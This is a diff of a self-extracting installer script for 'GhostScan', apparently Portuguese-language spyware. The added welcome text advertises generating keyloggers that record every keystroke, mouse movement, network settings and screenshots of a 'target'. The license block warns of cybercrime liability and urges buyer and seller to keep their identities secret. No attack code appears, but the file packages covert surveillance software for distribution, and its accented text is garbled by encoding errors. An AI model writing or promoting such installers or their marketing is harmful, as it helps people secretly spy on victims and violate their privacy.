@@ -1,14 +1,14 @@
 ;The comment below contains SFX script commands
 
-Path=C:\
-Setup=GhostScan/Sfile.exe
+Path=C:\Program Files\
+Setup=GhostScan/GhostScan.exe
 Title=Instalador do GhostScan
 Text
 {
-Por favor! nunca jamais mude o destino da instala√ß√£o, isso poder√° acarretar em erro na execu√ß√£o do programa e compila√ß√µes do keylogger, por isso, obrigatoriamente, deixe o destino no Disco Local C: por padr√£o, agrade√ßo por sua compreens√£o! 
+Instale e comeÁe a monitorar! O GhostScan È capaz de gerar keyloggers configurados para espionar qualquer coisa que vocÍ quiser, desde cada tecla pressionada e mouse, atÈ configuraÁıes de rede e print do monitor.. tudo isso a cada intervalo de tempo, assim vocÍ consegue de fato monitorar toda a atividade do seu alvo! 
 }
 License=Termos & Compromisso
 {
-1. O uso deste programa √© por conta e risco de cada um. 2. O usu√°rio tem responsabilidade plena sobre seus atos por esse programa, podendo responder pela lei de terrorismo virtual ou crime cybern√©tico. 3. A c√≥pia/imita√ß√£o deste software √© proibida, podendo sofrer processo sobre crime de c√≥pia e pl√°gio de direitos autorais. 4. O uso deste programa, assim como o vendedor que o venceu ter√° que permanecer em completo sigilo, n√£o revelando nomes, endere√ßos e nem identidade, por via das d√∫vidas, guarde seus atos em completo sigilo.
+1. O uso deste programa È por conta e risco de cada um. 2. O usu·rio tem responsabilidade plena sobre seus atos por esse programa, podendo responder pela lei de terrorismo virtual ou crime cybernÈtico. 3. A cÛpia/imitaÁ„o deste software È proibida, podendo sofrer processo sobre crime de cÛpia e pl·gio de direitos autorais. 4. O uso deste programa, assim como o vendedor que o venceu ter· que permanecer em completo sigilo, n„o revelando nomes, endereÁos e nem identidade, por via das d˙vidas, guarde seus atos em completo sigilo.
 }
-Shortcut=D, GhostScan/GhostScan.exe, , , , 
+Shortcut=D, GhostScan/GhostScan.lnk, , ,GhostScan, 
